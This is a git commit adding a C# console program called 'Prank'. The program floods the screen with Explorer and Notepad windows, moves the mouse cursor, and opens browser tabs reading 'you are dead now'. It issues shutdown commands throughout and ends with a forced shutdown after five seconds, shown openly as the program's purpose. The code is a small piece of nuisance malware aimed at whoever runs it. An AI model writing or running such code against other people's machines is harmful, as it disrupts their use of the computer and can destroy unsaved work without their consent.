6c12958302d6aa5dec3bea8dd6344ee2237ac1ce
Šimon Novák <82063567+sajmonekk191@users.noreply.github.com>
2021-08-08 17:05:39 +0200

    Add files via upload

---
+++ Prank/Prank/Program.cs
@@ -0,0 +1,202 @@
+﻿using System;
+using System.Diagnostics;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+namespace Prank
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool SetCursorPos(int X, int Y);
+        private static void Main(string[] args)
+        {
+            Text();
+            Main2();
+        }
+        private static void Text()
+        {
+            Console.Title = "H";
+            Thread.Sleep(100);
+            Console.Title = "HE";
+            Thread.Sleep(100);
+            Console.Title = "HEL";
+            Thread.Sleep(100);
+            Console.Title = "HELL";
+            Thread.Sleep(100);
+            Console.Title = "HELLO";
+            Thread.Sleep(100);
+            Console.Title = "HELLO :tf:";
+            Console.WriteLine(
+                "Hello !\n" +
+                "How are you :D\n" +
+                "Surprise :D");
+            Thread.Sleep(300);
+        }
+        private static void Main2()
+        {
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            SetCursorPos(300, 600);
+            Process.Start("notepad.exe");
+            Text2();
+            Process.Start("explorer.exe");
+            SetCursorPos(122, 720);
+            Process.Start("cmd.exe", "/c shutdown -r -t 200");
+            Process.Start("notepad.exe");
+            ded();
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Text2();
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            SetCursorPos(200, 100);
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            ded();
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Text2();
+            SetCursorPos(1062, 500);
+            Process.Start("explorer.exe");
+            Process.Start("cmd.exe", "/c shutdown -a");
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            SetCursorPos(511, 144);
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            SetCursorPos(144, 144);
+            ded();
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            SetCursorPos(500, 188);
+            Process.Start("explorer.exe");
+            Text2();
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            SetCursorPos(920, 74);
+            Process.Start("notepad.exe");
+            Process.Start("cmd.exe", "/c shutdown -r -t 200");
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            SetCursorPos(12, 74);
+            Process.Start("notepad.exe");
+            Process.Start("notepad.exe");
+            ded();
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Process.Start("cmd.exe", "/c shutdown -a");
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Text2();
+            Process.Start("explorer.exe");
+            SetCursorPos(512, 420);
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            SetCursorPos(844, 52);
+            Process.Start("notepad.exe");
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            ded();
+            Process.Start("notepad.exe");
+            Process.Start("explorer.exe");
+            Process.Start("notepad.exe");
+            Text2();
+            Process.Start("cmd.exe", "/c shutdown -s -t 5");
+            Console.ForegroundColor = ConsoleColor.Red;
+            bye();
+            Console.ForegroundColor = ConsoleColor.Blue;
+            bye();
+            Console.ForegroundColor = ConsoleColor.DarkCyan;
+            bye();
+            Console.ForegroundColor = ConsoleColor.DarkMagenta;
+            bye();
+            Console.ForegroundColor = ConsoleColor.DarkRed;
+            bye();
+            Console.ForegroundColor = ConsoleColor.White;
+            bye();
+            Console.ForegroundColor = ConsoleColor.Green;
+            bye();
+            Environment.Exit(0);
+        }
+        private static void Text2()
+        {
+            Console.Clear();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Thread.Sleep(100);
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Thread.Sleep(100);
+            Console.ForegroundColor = ConsoleColor.DarkYellow;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Thread.Sleep(100);
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Thread.Sleep(100);
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine(@"
+░█████╗░░█████╗░██╗░░░░░░█████╗░██████╗░░██████╗
+██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝
+██║░░╚═╝██║░░██║██║░░░░░██║░░██║██████╔╝╚█████╗░
+██║░░██╗██║░░██║██║░░░░░██║░░██║██╔══██╗░╚═══██╗
+╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║██████╔╝
+░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░");
+            Thread.Sleep(100);
+        }
+        private static void bye()
+        {
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+            Console.WriteLine("Okay Bye :D");
+        }
+        private static void ded()
+        {
+            string url = "https://www.google.com/search?q=you+are+dead+now&oq=YOU+ARE+DEAD+NOW&aqs=chrome.0.69i59j46j0j0i22i30l6j69i64.8559j0j4&sourceid=chrome&ie=UTF-8";
+            Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true });
+            Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true });
+        }
+    }
+}
